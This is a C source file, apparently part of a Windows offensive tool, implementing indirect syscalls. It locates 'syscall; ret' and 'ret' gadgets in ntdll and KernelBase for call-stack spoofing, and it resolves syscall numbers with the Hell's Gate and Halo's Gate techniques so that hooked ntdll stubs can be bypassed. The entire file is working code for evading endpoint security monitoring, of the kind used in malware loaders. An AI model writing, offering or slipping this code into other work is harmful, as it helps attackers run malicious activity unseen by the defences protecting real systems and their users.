#include "indirect_syscall.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>

void *sc_gadget = NULL;
void *sc_frame1 = NULL;
void *sc_frame2 = NULL;

/* Scan ntdll/KernelBase .text for a byte sequence starting at min_off bytes in. */
static BYTE *_find_seq(HMODULE h, const BYTE *seq, int seqlen, SIZE_T min_off)
{
    if (!h) return NULL;
    IMAGE_DOS_HEADER  *dos = (IMAGE_DOS_HEADER  *)(void *)h;
    IMAGE_NT_HEADERS  *nt  = (IMAGE_NT_HEADERS  *)((BYTE *)h + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;
        BYTE   *base = (BYTE *)h + sec->VirtualAddress;
        SIZE_T  sz   = sec->Misc.VirtualSize;
        for (SIZE_T j = min_off; j + (SIZE_T)seqlen <= sz; j++) {
            int ok = 1;
            for (int k = 0; k < seqlen; k++)
                if (base[j + k] != seq[k]) { ok = 0; break; }
            if (ok) return base + j;
        }
    }
    return NULL;
}

int sc_init(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    HMODULE kbase = GetModuleHandleA("KernelBase.dll");
    if (!ntdll) return -1;

    /* syscall;ret = 0F 05 C3 */
    static const BYTE gadget_seq[] = { 0x0F, 0x05, 0xC3 };
    sc_gadget = _find_seq(ntdll, gadget_seq, 3, 0);
    if (!sc_gadget) return -1;

    /* ret gadgets for call-stack spoofing — skip first few KB to stay in body code */
    static const BYTE ret_seq[] = { 0xC3 };
    if (kbase) sc_frame1 = _find_seq(kbase, ret_seq, 1, 0x2000);
    sc_frame2 = _find_seq(ntdll,  ret_seq, 1, 0x3000);

    /* fallback: both frames in ntdll if KernelBase ret not found */
    if (!sc_frame1) sc_frame1 = sc_frame2;
    if (!sc_frame2) return -1;

    return 0;
}

uint16_t sc_ssn(const char *name)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0xFFFF;

    BYTE *fn = (BYTE *)(void *)GetProcAddress(ntdll, name);
    if (!fn) return 0xFFFF;

    /* Hell's Gate: stub is clean — read SSN from mov eax,<ssn> */
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8)
        return *(uint16_t *)(fn + 4);

    /* Halo's Gate: stub is hooked — scan EAT for an unhooked neighbor */
    IMAGE_DOS_HEADER     *dos = (IMAGE_DOS_HEADER     *)(void *)ntdll;
    IMAGE_NT_HEADERS     *nt  = (IMAGE_NT_HEADERS     *)((BYTE *)ntdll + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)
        ((BYTE *)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)ntdll + exp->AddressOfNames);
    DWORD *funcs = (DWORD *)((BYTE *)ntdll + exp->AddressOfFunctions);
    WORD  *ords  = (WORD  *)((BYTE *)ntdll + exp->AddressOfNameOrdinals);

    int idx = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (strcmp((char *)((BYTE *)ntdll + names[i]), name) == 0) {
            idx = (int)i;
            break;
        }
    }
    if (idx < 0) return 0xFFFF;

    /* scan up to 32 neighbors in both directions */
    for (int d = 1; d <= 32; d++) {
        for (int s = -1; s <= 1; s += 2) {
            int ni = idx + s * d;
            if (ni < 0 || ni >= (int)exp->NumberOfNames) continue;
            BYTE *nb = (BYTE *)ntdll + funcs[ords[ni]];
            if (nb[0] == 0x4C && nb[1] == 0x8B && nb[2] == 0xD1 && nb[3] == 0xB8)
                return (uint16_t)(*(uint16_t *)(nb + 4) - (uint16_t)(s * d));
        }
    }
    return 0xFFFF;
}
